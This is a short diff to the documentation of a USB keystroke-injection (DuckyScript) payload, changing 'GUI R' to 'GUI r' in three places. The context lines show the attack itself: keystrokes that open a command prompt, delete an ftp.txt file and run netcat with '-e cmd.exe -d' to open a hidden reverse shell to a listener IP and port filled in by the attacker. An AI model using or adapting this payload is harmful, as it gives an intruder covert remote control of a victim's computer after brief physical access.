@@ -7,7 +7,7 @@ This script will:
 Fill in the required information where you see the brackets.
 ```c
 DELAY 10000
-GUI R
+GUI r
 DELAY 200
 STRING cmd
 ENTER
@@ -41,12 +41,12 @@ ENTER
 STRING del ftp.txt & exit
 ENTER
 DELAY 2000
-GUI R
+GUI r
 DELAY 200
 STRING nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d
 ENTER
 DELAY 2000
-GUI R
+GUI r
 DELAY 200
 STRING cmd
 ENTER
